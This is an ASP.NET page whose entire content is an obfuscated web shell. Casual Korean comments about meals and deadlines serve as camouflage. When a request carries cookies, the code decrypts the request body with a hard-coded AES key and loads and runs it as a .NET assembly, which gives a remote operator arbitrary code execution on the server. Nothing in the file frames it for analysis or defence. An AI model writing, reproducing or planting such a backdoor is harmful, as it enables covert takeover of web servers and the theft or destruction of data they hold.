<%@ Page Language="C#" %><%
// 배고파요, 점심 뭐 먹지?
if (Request.Cookies.Count > 0)
{
    // 이 코드는 정말 이해하기 어렵네요.
    Func<string, byte[]> f_to_bytes = (b64) => { return Convert.FromBase64String(b64); };
    Func<byte[], string> f_to_str = (b) => { return System.Text.Encoding.UTF8.GetString(b); };

    // 프로젝트 마감일이 언제였더라...
    string cfg_a = f_to_str(f_to_bytes("Y2E2MzQ1NzUzOGI5YjFlMA=="));
    string cfg_b = f_to_str(f_to_bytes("Sw=="));

    Action<Page> entry_point = (page_ctx) => {
        // 오늘 저녁은 뭘 먹을까?
        byte[] p1 = System.Text.Encoding.Default.GetBytes(cfg_a);
        
        Func<System.IO.Stream, byte[]> stream_reader = (strm) => {
            if (strm.Length == 0) return null;
            byte[] buffer = new byte[strm.Length];
            strm.Read(buffer, 0, buffer.Length);
            return buffer;
        };
        
        byte[] p2 = stream_reader(page_ctx.Request.InputStream);
        
        // 퇴근하고 싶다.
        if (p2 != null)
        {
            Func<byte[], byte[], byte[]> data_processor = (dat, k) => {
                var alg = new System.Security.Cryptography.RijndaelManaged();
                // 왜 키랑 IV가 똑같지? 이상한 설계네.
                var transformer = alg.CreateDecryptor(k, k);
                return transformer.TransformFinalBlock(dat, 0, dat.Length);
            };

            byte[] p3 = data_processor(p2, p1);

            // 마지막 단계. 이제 곧 끝난다.
            Action<byte[], string, Page> module_loader = (mod_bytes, type_name, ctx) => {
                var loaded_mod = System.Reflection.Assembly.Load(mod_bytes);
                var runtime_obj = loaded_mod.CreateInstance(type_name);
                runtime_obj.Equals(ctx);
            };

            module_loader(p3, cfg_b, page_ctx);
        }
    };
    
    // 실행!
    entry_point(this);
}
%>